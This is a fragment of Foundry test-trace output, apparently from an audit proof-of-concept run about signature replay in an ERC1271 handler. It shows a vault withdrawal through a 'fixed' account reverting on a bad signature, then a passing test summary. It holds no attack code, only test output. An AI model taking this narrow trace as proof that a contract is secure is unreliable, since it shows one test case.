+    ├─ [8848] SignatureGatedVault::withdraw(FixedSsoAccount: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 0x1111111111111111111111111111111111111111, 1000000000000000000 [1e18], 0, 0x02abf86143c397c23c6342afdc9c757ed7de65ac42fef295416476c49b271bea67e0ca7f9e14eed29b6c1a7efb0218ad4275a302e27e8b02aa74d6e43d577f3d1b)
+    │   ├─ [4841] FixedSsoAccount::isValidSignature(0x4fe4427f79eccb4619bdea153692e8745a86013ad8224a666aafbe4ec5190ed0, 0x02abf86143c397c23c6342afdc9c757ed7de65ac42fef295416476c49b271bea67e0ca7f9e14eed29b6c1a7efb0218ad4275a302e27e8b02aa74d6e43d577f3d1b) [staticcall]
+    │   │   ├─ [3000] PRECOMPILES::ecrecover(0x8d626b4e71340ef36ee8efe339adbda5e4e234a1a95c3159ea4533198e8b6df3, 27, 1208470800588853026382599156969238100712244704813044052108690964220987513834, 46985394739910027893970845682106504727270856792135079896651273360054144171837) [staticcall]
+    │   │   │   └─ ← [Return] 0xb1CC69223dcB755f9c4F4585Ef9584463ec8eC1d
+    │   │   └─ ← [Return] 0x00000000
+    │   └─ ← [Revert] vault: bad sig
+    └─ ← [Stop]
+
+Suite result: ok. 4 passed; 0 failed; 0 skipped; finished in 120.49ms (134.45ms CPU time)
+
+Ran 1 test suite in 141.04ms (120.49ms CPU time): 4 tests passed, 0 failed, 0 skipped (4 total tests)
+_shared/run-poc/run_poc.sh: line 71: 84296 Killed: 9               nice -n 10 anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: ~/RustroverProjects/audits/evm-hack-registry/56710-potential-signature-replay-attack-in-erc1271handler-openzepp_exp)
